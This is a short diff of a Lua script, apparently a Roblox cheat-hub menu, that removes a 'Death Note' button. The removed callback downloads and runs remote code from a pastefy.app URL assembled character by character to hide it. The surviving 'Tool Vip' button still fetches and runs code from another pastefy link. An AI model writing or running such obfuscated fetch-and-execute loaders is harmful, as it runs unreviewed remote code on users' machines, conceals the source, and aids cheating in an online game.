@@ -491,12 +491,6 @@ A:AddButton({
   	end
 })
 A:AddButton({
-	Name = "Death Note",
-	Callback = function()
-        loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'G'..'o'..'K'..'x'..'Y'..'B'..'k'..'U'..'/'..'r'..'a'..'w'), true))()
-  	end
-})
-A:AddButton({
 	Name = "Tool Vip",
 	Callback = function()
         loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()
